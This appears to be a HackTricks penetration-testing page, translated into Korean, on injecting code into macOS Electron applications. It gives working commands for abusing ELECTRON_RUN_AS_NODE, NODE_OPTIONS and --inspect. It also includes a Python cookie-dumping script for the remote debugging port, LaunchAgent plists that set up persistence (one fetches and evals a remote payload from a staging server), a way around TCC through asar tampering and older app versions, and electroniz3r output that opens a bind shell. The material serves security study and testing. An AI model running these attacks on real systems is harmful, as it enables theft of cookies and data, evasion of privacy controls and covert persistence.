# macOS Electron Applications Injection

{% hint style="success" %}
AWS 해킹을 배우고 실습하세요:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹을 배우고 실습하세요: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리에 PR을 제출하여 해킹 요령을 공유하세요.

</details>
{% endhint %}

## 기본 정보

Electron이 무엇인지 모르는 경우 [**여기에서 많은 정보를 찾을 수 있습니다**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). 하지만 지금은 Electron이 **node**를 실행한다는 것을 알아두세요.\
그리고 node에는 **다른 코드를 실행**할 수 있게 하는 **매개변수** 및 **환경 변수**가 있습니다.

### Electron Fuses

이러한 기술은 다음에 설명될 것이지만, 최근 Electron은 이를 **방지하는 여러 보안 플래그를 추가**했습니다. 이러한 것들이 **Electron Fuses**이며 macOS의 Electron 앱에서 **임의의 코드를 로드하는 것을 방지**하는 데 사용되는 것들입니다:

* **`RunAsNode`**: 비활성화되면 env var **`ELECTRON_RUN_AS_NODE`** 사용을 방지하여 코드를 주입합니다.
* **`EnableNodeCliInspectArguments`**: 비활성화되면 `--inspect`, `--inspect-brk`와 같은 매개변수가 존중되지 않습니다. 이를 통해 코드 주입을 방지합니다.
* **`EnableEmbeddedAsarIntegrityValidation`**: 활성화되면 로드된 **`asar`** **파일**이 macOS에서 **검증**됩니다. 이 파일의 내용을 수정하여 코드 주입을 방지합니다.
* **`OnlyLoadAppFromAsar`**: 이 기능이 활성화되면 **`app.asar`**, **`app`** 및 마지막으로 **`default_app.asar`** 순서로 로드하는 대신 app.asar만 확인하고 사용합니다. 따라서 **`embeddedAsarIntegrityValidation`** 퓨즈와 **결합**되었을 때 **검증되지 않은 코드를 로드하는 것이 불가능**합니다.
* **`LoadBrowserProcessSpecificV8Snapshot`**: 활성화되면 브라우저 프로세스가 V8 스냅샷을 위해 `browser_v8_context_snapshot.bin`이라는 파일을 사용합니다.

코드 주입을 방지하지 않는 다른 흥미로운 퓨즈는:

* **EnableCookieEncryption**: 활성화되면 디스크에 저장된 쿠키 저장소가 OS 수준의 암호화 키를 사용하여 암호화됩니다.

### Electron Fuses 확인

응용 프로그램에서 **이러한 플래그를 확인**할 수 있습니다:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron 퓨즈 수정

[**문서에서 언급한 것**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)대로, **Electron 퓨즈**의 구성은 **Electron 이진 파일** 내부에 구성되어 있으며, 이 파일에는 어딘가에 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** 문자열이 포함되어 있습니다.

macOS 애플리케이션에서는 일반적으로 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`에 위치합니다.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
## RCE 코드를 Electron 애플리케이션에 추가

Electron 앱이 사용하는 **외부 JS/HTML 파일**이 있을 수 있으므로 공격자는 이러한 파일에 코드를 삽입하여 서명이 확인되지 않는 코드를 실행하고 앱의 컨텍스트에서 임의의 코드를 실행할 수 있습니다.

{% hint style="danger" %}
그러나 현재 2가지 제한 사항이 있습니다:

* 앱을 수정하려면 **`kTCCServiceSystemPolicyAppBundles`** 권한이 **필요**하므로 기본적으로 더 이상 불가능합니다.
* 컴파일된 **`asap`** 파일에는 일반적으로 퓨즈 **`embeddedAsarIntegrityValidation`** 및 **`onlyLoadAppFromAsar`**가 `활성화`되어 있습니다.

이 공격 경로를 더 복잡하게 만들거나 불가능하게 만듭니다.
{% endhint %}

**`kTCCServiceSystemPolicyAppBundles`** 요구 사항을 우회하는 것이 가능하며, 애플리케이션을 다른 디렉토리(예: **`/tmp`**)로 복사하고 폴더 이름을 **`app.app/Contents`**에서 **`app.app/NotCon`**으로 변경한 다음, **악의적인** 코드로 **asar** 파일을 수정하고 다시 **`app.app/1`**로 이름을 변경한 후 실행할 수 있습니다.

asar 파일에서 코드를 추출할 수 있습니다:
```bash
npx asar extract app.asar app-decomp
```
그리고 수정한 후에 다시 패킹하세요:
```bash
npx asar pack app-decomp app-new.asar
```
## `ELECTRON_RUN_AS_NODE`를 사용한 RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**문서**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)에 따르면, 이 환경 변수가 설정되면 프로세스가 일반 Node.js 프로세스로 시작됩니다.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
만약 fuse **`RunAsNode`**가 비활성화되어 있다면 env var **`ELECTRON_RUN_AS_NODE`**은 무시되며 작동하지 않을 것입니다.
{% endhint %}

### 앱 Plist로부터의 Injection

[**여기에서 제안된 것**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)과 같이, 이 env 변수를 plist에 남아 있는 상태로 악용할 수 있습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS`를 사용한 RCE

페이로드를 다른 파일에 저장하고 실행할 수 있습니다:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
만약 fuse **`EnableNodeOptionsEnvironmentVariable`** 가 **비활성화**되어 있다면, 앱은 **실행될 때** 환경 변수 **NODE\_OPTIONS**를 **무시**할 것이며, 환경 변수 **`ELECTRON_RUN_AS_NODE`**가 설정되지 않으면 또한 **무시**될 것입니다. 이때 fuse **`RunAsNode`**가 비활성화되어 있다면 더욱 그렇습니다.

**`ELECTRON_RUN_AS_NODE`**를 설정하지 않으면, 다음 **에러**를 발견할 수 있습니다: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### 앱 Plist로부터의 Injection

이 환경 변수를 plist에 남아있게 유지하기 위해 이러한 키를 추가할 수 있습니다:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 검사를 통한 RCE

[**이**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)에 따르면, Electron 애플리케이션을 **`--inspect`**, **`--inspect-brk`**, **`--remote-debugging-port`**와 같은 플래그로 실행하면 **디버그 포트가 열리므로** 해당 포트에 연결할 수 있습니다 (예: Chrome의 `chrome://inspect`에서) 그리고 **코드를 주입**하거나 새로운 프로세스를 시작할 수 있습니다.\
예를 들어:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
만약 fuse **`EnableNodeCliInspectArguments`**가 비활성화된 경우, 앱은 시작될 때 **`--inspect`**와 같은 노드 매개변수를 **무시**하게 됩니다. 이를 우회하려면 환경 변수 **`ELECTRON_RUN_AS_NODE`**를 설정해야 하며, 이는 fuse **`RunAsNode`**가 비활성화된 경우에도 **무시**됩니다.

그러나 여전히 **electron 매개변수 `--remote-debugging-port=9229`**를 사용할 수 있지만, 이전 payload는 다른 프로세스를 실행하는 데 사용할 수 없습니다.
{% endhint %}

**`--remote-debugging-port=9222`** 매개변수를 사용하면 Electron 앱에서 **history** (GET 명령어로)나 브라우저의 **cookies**를 **훔칠 수** 있습니다 (브라우저 내에서 **복호화**되고 제공되는 **json 엔드포인트**가 있습니다).

이를 수행하는 방법은 [**여기**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)와 [**여기**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)에서 확인할 수 있으며, 자동 도구 [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)이나 다음과 같은 간단한 스크립트를 사용할 수 있습니다:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
[**이 블로그 포스트**](https://hackerone.com/reports/1274695)에서는 이 디버깅이 남용되어 headless chrome이 **임의의 위치에 임의의 파일을 다운로드**하도록 만들어졌습니다.

### 앱 Plist로부터의 Injection

이 환경 변수를 plist에 남용하여 이러한 키를 추가하여 지속성을 유지할 수 있습니다:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 이전 버전 낡은 버전을 악용한 TCC 우회

{% hint style="success" %}
macOS의 TCC 데몬은 응용 프로그램의 실행 버전을 확인하지 않습니다. 따라서 이전 기술 중 어떤 것으로도 **일렉트론 응용 프로그램에 코드를 삽입할 수 없는 경우** APP의 이전 버전을 다운로드하고 여전히 TCC 권한을 얻을 수 있도록 코드를 삽입할 수 있습니다 (Trust Cache가 방지하지 않는 한).
{% endhint %}

## 비 JS 코드 실행

이전 기술을 사용하면 **일렉트론 응용 프로그램의 프로세스 내에서 JS 코드를 실행**할 수 있습니다. 그러나 **자식 프로세스는 부모 응용 프로그램과 동일한 샌드박스 프로필**에서 실행되며 **그들의 TCC 권한을 상속**합니다.\
따라서 카메라 또는 마이크에 액세스하기 위해 권한을 남용하려면 **프로세스에서 다른 이진 파일을 실행**할 수 있습니다.

## 자동 삽입

도구 [**electroniz3r**](https://github.com/r3ggi/electroniz3r)은 설치된 **취약한 일렉트론 응용 프로그램을 찾아서 코드를 삽입**하는 데 쉽게 사용할 수 있습니다. 이 도구는 **`--inspect`** 기술을 사용하려고 시도할 것입니다:

스스로 컴파일해야 하며 다음과 같이 사용할 수 있습니다:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 참고 자료

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 저장소에 PR을 제출하여 해킹 요령을 공유하세요.

</details>
{% endhint %}
